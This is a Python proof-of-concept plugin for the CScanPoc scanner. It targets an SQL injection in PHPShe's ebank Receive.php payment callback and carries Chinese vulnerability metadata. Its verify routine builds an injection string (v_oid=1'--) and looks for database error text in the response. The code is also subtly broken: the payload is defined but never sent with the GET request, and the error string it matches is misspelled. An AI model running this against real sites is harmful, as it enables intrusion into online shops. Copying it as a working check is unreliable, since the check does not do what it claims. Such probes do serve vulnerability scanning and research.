# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PHPShe_0003'  # 平台漏洞编号，留空
    name = 'PHPShe SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-03'  # 漏洞公布时间
    desc = '''
        PHPSHE网上商城系统具备电商零售业务所需的所有基本功能,以其安全稳定、简单易用、高效专业等优势赢得了用户的广泛好评,为用户提供了一个低成本、高效率的网上商城服务。
        漏洞文件:include\plugin\payway\ebank\Receive.php 逻辑错误造成注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2738/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPShe'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8e7801ae-357c-4baa-9c80-4852c394cac4'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/include/plugin/payway/ebank/Receive.php'
            data = "v_oid=1'--&v_pmode=1&v_patatus=20&v_pstring=1&v_amount=1&v_moneytype=1&remark1=1&remark2=1&v_md5str=2E0551D59CFAF9A6E248BC5B3BDE39B5"
            url = self.target + payload
            r = requests.get(url)

            if 'Warning:myql_fetch_assoc' in r.text and 'include/class/db.class.php' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
